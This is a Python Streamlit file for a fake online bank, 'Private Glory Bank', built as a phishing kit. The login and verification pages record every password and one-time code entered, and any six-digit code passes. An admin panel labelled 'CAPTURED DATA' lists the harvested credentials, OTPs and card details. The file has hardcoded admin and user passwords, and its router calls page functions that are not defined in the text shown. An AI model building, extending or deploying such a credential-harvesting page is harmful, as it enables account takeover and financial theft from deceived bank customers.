import streamlit as st
import pandas as pd
from datetime import datetime
import random
import plotly.express as px  # <-- This fixes ALL pie/chart errors

# ====== SESSION STATE INIT ======
if "checking_balance" not in st.session_state:
    st.session_state.checking_balance = 12340.50
if "savings_balance" not in st.session_state:
    st.session_state.savings_balance = 14911.32
if "account_nicknames" not in st.session_state:
    st.session_state.account_nicknames = {
        "Private Glory Checking ••••1776": "Private Glory Checking ••••1776",
        "Stars & Stripes Savings ••••1812": "Stars & Stripes Savings ••••1812"
    }
if "custom_theme" not in st.session_state:
    st.session_state.custom_theme = "Private Glory"
if "font_size" not in st.session_state:
    st.session_state.font_size = 14
if "language" not in st.session_state:
    st.session_state.language = "English"
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []
if "scheduled_transfers" not in st.session_state:
    st.session_state.scheduled_transfers = []
if "login_history" not in st.session_state:
    st.session_state.login_history = []
if "file_uploads" not in st.session_state:
    st.session_state.file_uploads = []
if "transactions" not in st.session_state:
    st.session_state.transactions = []

for key in ["authenticated", "otp_verified", "attempts", "is_admin"]:
    if key not in st.session_state:
        st.session_state[key] = False

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ====== CUSTOM CSS (UNCHANGED, JUST CLEAN) ======
def custom_style():
    font_selected = st.session_state.font_size
    st.markdown(f"""
    <style>
        .stApp {{
            background: linear-gradient(145deg, #fff 65%, #002868 100%);
            color: #1b1b1b;
            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
            font-size:{font_selected}px;
        }}
        .privateglory-header {{
            background: repeating-linear-gradient(90deg, #002868 0, #002868 60px, #BF0A30 60px, #BF0A30 120px);
            padding: 22px;
            text-align: center;
            border-bottom: 10px solid #fcca46;
            border-radius: 0 0 30px 30px;
        }}
        .glass-card {{
            background: rgba(255,255,255,0.95);
            color: #14213d !important;
            border-radius: 18px;
            padding: 32px;
            box-shadow: 0 8px 28px rgba(0,40,104,0.15);
            margin: 28px 0;
            border-bottom: 5px solid #BF0A30;
            border-right: 4px solid #002868;
            border-left: 4px solid #fcca46;
            backdrop-filter: blur(10px);
        }}
        .privateglory-btn, .stButton>button {{
            background: linear-gradient(90deg, #BF0A30 60%, #002868 100%) !important; 
            color: #fff !important; 
            font-weight: bold !important;
            border-radius: 12px !important; 
            border: none !important; 
            padding: 12px 32px !important;
            box-shadow: 0 4px 12px rgba(0,40,104,0.20);
        }}
        .privateglory-btn:hover, .stButton>button:hover {{
            background: #fcca46 !important;
            color: #BF0A30 !important;
        }}
        .big-logo {{font-size: 130px; text-align: center; background: linear-gradient(90deg, #002868 70%, #BF0A30 100%);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;}}
        h1, h2, h3 {{color: #BF0A30 !important; text-shadow: 1px 1px 4px #00286833;}}
        .money-text, .stMetricValue {{color: #fcca46 !important; font-size:1.5em; font-weight:bold;}}
        .us-stars {{font-size:26px; color: #fcca46; letter-spacing: 8px;}}
    </style>
    """, unsafe_allow_html=True)
custom_style()

# ====== THEME SWITCHER ======
def theme_switcher():
    with st.sidebar.expander("Eagle Private Glory Theme & Accessibility"):
        theme = st.selectbox("Theme", ["Private Glory", "Classic American", "Modern"], key='sidebar_theme')
        st.session_state.custom_theme = theme
        current_font_size = st.session_state.font_size if isinstance(st.session_state.font_size, int) else 14
        st.session_state.font_size = st.slider("Font Size", 10, 30, current_font_size, key='sidebar_font_size')
        lang = st.selectbox("Language", ["English", "Español", "Français"], key='sidebar_language')
        st.session_state.language = lang

# ====== CREDENTIALS & ADMIN ======
VALID_USERNAME = "client001"
VALID_PASSWORD = "SecureUSA2025!"
ADMIN_USER = "admin"
ADMIN_PASS = "showme2025"

# ====== PAGES ======
def login_page():
    st.markdown("<div class='privateglory-header'><div class='big-logo'>Eagle</div><h1>Welcome to Private Glory Bank</h1></div>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1,2,1])
    with col2:
        username = st.text_input("User ID", placeholder="Enter your User ID")
        password = st.text_input("Password", type="password", placeholder="Enter your password")
        if st.button("Log In", type="primary", use_container_width=True):
            st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "user": username, "pass": password})
            st.session_state.login_history.append({"time": datetime.now().strftime("%Y-%m-%d %H:%M"), "user": username})
            if username == VALID_USERNAME and password == VALID_PASSWORD:
                st.session_state.authenticated = True
                st.session_state.otp_verified = False
                st.rerun()
            elif username == ADMIN_USER and password == ADMIN_PASS:
                st.session_state.is_admin = True
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("Incorrect User ID or password")

def otp_page():
    st.markdown("<div style='text-align:center; padding:80px'>", unsafe_allow_html=True)
    st.markdown("<h1>Security Verification</h1><p>We sent a 6-digit code to your phone ending in <b>--1776</b></p>", unsafe_allow_html=True)
    code = st.text_input("Enter code", max_chars=6, placeholder="000000")
    if st.button("Verify", type="primary", use_container_width=True):
        st.session_state.captured_otp.append({"time": datetime.now().strftime("%H:%M"), "otp": code})
        if len(code) == 6 and code.isdigit():
            st.session_state.otp_verified = True
            st.rerun()
        else:
            st.error("Invalid code")

def admin_view():
    st.markdown("<h1 style='color:#BF0A30; text-align:center'>EAGLE ADMIN — CAPTURED DATA</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Credentials", "OTPs", "Cards & Payments", "Transfers", "Logins", "Files", "Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(st.session_state.captured_creds)) if st.session_state.captured_creds else st.info("No creds yet")
    with tabs[1]: st.dataframe(pd.DataFrame(st.session_state.captured_otp)) if st.session_state.captured_otp else st.info("No OTPs")
    with tabs[2]: 
        cards = [x for x in st.session_state.captured_creds if "card_payment" in x] + [x for x in st.session_state.transactions if x["method"] == "Credit Card"]
        st.dataframe(pd.DataFrame(cards)) if cards else st.info("No cards")
    with tabs[3]: st.dataframe(pd.DataFrame(st.session_state.scheduled_transfers))
    with tabs[4]: st.dataframe(pd.DataFrame(st.session_state.login_history))
    with tabs[5]: st.dataframe(pd.DataFrame(st.session_state.file_uploads))
    with tabs[6]: st.dataframe(pd.DataFrame(st.session_state.transactions))

def dashboard():
    total = st.session_state.checking_balance + st.session_state.savings_balance
    greeting = f"Welcome back!" if not st.session_state.is_admin else "Welcome Admin!"

    st.markdown(f"""
    <div class='privateglory-header'>
        <span class='big-logo'>Eagle</span>
        <div class='us-stars'>★★★★★</div>
        <h1>Private Glory Bank</h1>
        <p style='color:#fcca46;font-size:20px;'><b>In God We Trust</b></p>
    </div>
    """, unsafe_allow_html=True)
    st.write(f"### {greeting}")

    c1, c2, c3, c4 = st.columns(4)
    with c1: st.metric("Total Balance", f"${total:,.2f}")
    with c2: st.metric("Available Credit", "$15,700")
    with c3: st.metric("Monthly Spending", "$3,214")
    with c4: st.metric("Savings Goal", "78%")

    col1, col2 = st.columns(2)
    with col1:
        st.markdown("#### Asset Distribution")
        pie_df = pd.DataFrame({
            "Account": ["Checking", "Savings"],
            "Amount": [st.session_state.checking_balance, st.session_state.savings_balance]
        })
        fig = px.pie(pie_df, values="Amount", names="Account", color_discrete_sequence=["#BF0A30", "#002868"])
        st.plotly_chart(fig, use_container_width=True)

    with col2:
        st.markdown("#### This Year's Spending")
        spending = {"Food & Dining": 3600, "Bills": 3800, "Shopping": 2700, "Travel": 2200, "Subscriptions": 1400}
        fig2 = px.bar(x=list(spending.keys()), y=list(spending.values()), color_discrete_sequence=["#fcca46"])
        st.plotly_chart(fig2, use_container_width=True)

    st.markdown("<div style='text-align:center;font-size:30px;color:#BF0A30'>USA</div>", unsafe_allow_html=True)


# accounts(), cards_page(), validate_*(), transfer(), transaction_history(), messages(), security(), budget_page(), settings_page(), sidebar()

# ====== SIDEBAR & ROUTING (unchanged) ======
def sidebar():
    st.sidebar.markdown("""
        <div style='text-align:center;padding:20px;background:linear-gradient(135deg,#002868,#BF0A30);border-radius:20px;color:white'>
            <div style='font-size:60px'>Eagle</div>
            <h2>Private Glory Bank</h2>
            <p><i>Land of the Free</i></p>
        </div>
    """, unsafe_allow_html=True)
    page = st.sidebar.radio("Navigate", [
        "Dashboard", "Accounts", "Cards", "Transfer & Payments",
        "Messages", "Security", "Budget", "Transaction History", "Settings"
    ])
    theme_switcher()
    if st.sidebar.button("Log Out", type="primary"):
        for k in ["authenticated", "otp_verified", "is_admin"]:
            st.session_state[k] = False
        st.rerun()
    return page

# ====== MAIN LOGIC ======
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    current = sidebar()
    if current == "Dashboard": dashboard()
    elif current == "Accounts": accounts()
    elif current == "Cards": cards_page()
    elif current == "Transfer & Payments": transfer()
    elif current == "Messages": messages()
    elif current == "Security": security()
    elif current == "Budget": budget_page()
    elif current == "Transaction History": transaction_history()
    elif current == "Settings": settings_page()
    else: dashboard()
